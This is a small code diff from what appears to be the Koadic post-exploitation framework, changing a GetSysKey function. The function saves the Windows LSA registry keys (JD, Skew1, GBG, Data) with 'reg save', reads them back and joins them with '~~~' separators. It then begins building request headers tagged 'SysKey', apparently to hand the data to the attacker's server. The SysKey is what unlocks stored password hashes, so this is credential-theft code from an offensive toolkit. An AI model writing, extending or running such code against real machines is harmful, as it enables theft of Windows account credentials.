@@ -11,9 +11,9 @@ function GetSysKey()
     Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);
 
     var data = Koadic.file.readBinary(jdpath);
-    data += Koadic.file.readBinary(skew1path);
-    data += Koadic.file.readBinary(gbgpath);
-    data += Koadic.file.readBinary(datapath);
+    data += "~~~"+Koadic.file.readBinary(skew1path);
+    data += "~~~"+Koadic.file.readBinary(gbgpath);
+    data += "~~~"+Koadic.file.readBinary(datapath);
 
     var headers = {};
     headers["Task"] = "SysKey";
